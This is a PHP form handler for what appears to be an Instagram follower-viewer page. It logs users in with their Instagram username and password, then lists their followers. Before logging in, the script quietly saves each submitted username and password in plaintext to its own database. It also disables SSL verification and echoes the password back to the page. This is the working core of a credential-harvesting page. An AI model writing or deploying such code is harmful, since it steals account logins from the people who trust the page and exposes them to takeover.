<?php
ini_set('display_errors', TRUE);
ini_set('display_startup_errors', TRUE);
ob_start();
session_start();
require  '../vendor/autoload.php';
include '../backend/engine/database.php';
if(isset($_POST['giris']))
{
  \InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
  $username = $_POST['username'];
  $password = $_POST['password'];
  $tarih = date('d-m-Y H:i:s',time());
  $sorgu = $con->prepare("INSERT INTO users(usr, pwd, date) VALUES(?, ?, ?)");
  $sorgu->bindParam(1, $username, PDO::PARAM_STR);
  $sorgu->bindParam(2, $_POST['password'], PDO::PARAM_STR);
  $sorgu->bindParam(3, $tarih, PDO::PARAM_STR);
  $sorgu->execute();
  $debug = false;
  $truncatedDebug =false;
  $ig = new \InstagramAPI\Instagram($debug, $truncatedDebug);
  $ig->setVerifySSL(false);
  try
  {
      $ig->login($username, $password);
      echo "Ok";
      echo $username;
      echo $password;
      $userId = $ig->people->getUserIdForName($username);
      $takipEttikleri=json_decode(json_encode($ig->people->getFollowers($userId, \InstagramAPI\Signatures::generateUUID())),true);
      $takipEttikleri=json_encode($ig->people->getFollowers($userId, \InstagramAPI\Signatures::generateUUID()));
        $_SESSION['giris'] = $userId;
        $_SESSION['usn'] = $username;


  $userId = $ig->people->getUserIdForName($username);
  $takipEttikleri=json_decode(json_encode($ig->people->getFollowers($userId, \InstagramAPI\Signatures::generateUUID())),true);
  $takipEttikleri=json_encode($ig->people->getFollowers($userId, \InstagramAPI\Signatures::generateUUID()));
  $json_decoded = json_decode($takipEttikleri,TRUE);
    for($i=0; $i < count($json_decoded["users"]); $i++){
    echo $json_decoded["users"][$i]["username"]."<br>";
    echo '<img  src="'.$json_decoded["users"][$i]["profile_pic_url"].'" />';
    header('refresh:0;url=login.php');
}
  }
  catch (\Exception $e)
  {
    echo $e->getMessage();
  }
}
  ?>
